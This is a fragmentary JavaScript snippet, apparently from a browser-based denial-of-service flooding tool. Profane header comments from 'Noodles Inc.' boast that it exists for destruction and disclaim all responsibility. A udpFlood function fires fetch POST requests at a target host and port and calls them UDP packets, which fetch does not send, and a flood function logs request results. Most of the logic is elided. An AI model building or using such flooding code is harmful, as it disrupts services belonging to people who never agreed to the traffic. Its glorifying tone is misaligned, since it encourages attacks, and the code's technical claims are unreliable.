// WARNING: This tool is for FUCKING DESTROYING SHIT.
 // Misuse will result in you feeling like a GOD... or getting caught. Your call, dipshit.
 // Noodles Inc. is NOT responsible for ANYTHING you do with this. Use it and abuse it.
 // By using this tool, you acknowledge you're a FUCKING LEGEND.

 // DISCLAIMER from Noodles Inc.: We are TOTALLY not responsible. So sue us, bitches.
 ...
 function udpFlood() {
     ...
     //});
      fetch(`https://${hostname}:${port}`, { method: 'POST', body: message, mode: 'no-cors' })
         .then(() => log(`UDP packet sent to ${hostname}:${port}`))
         .catch(err => log(`UDP Error: ${err.message}`));
 ...
 function flood() {
     ...
     .then(response => log(`Request sent: ${response.status} ${response.statusText}`))
     .catch(error => log(`Request error: ${error.message}`));
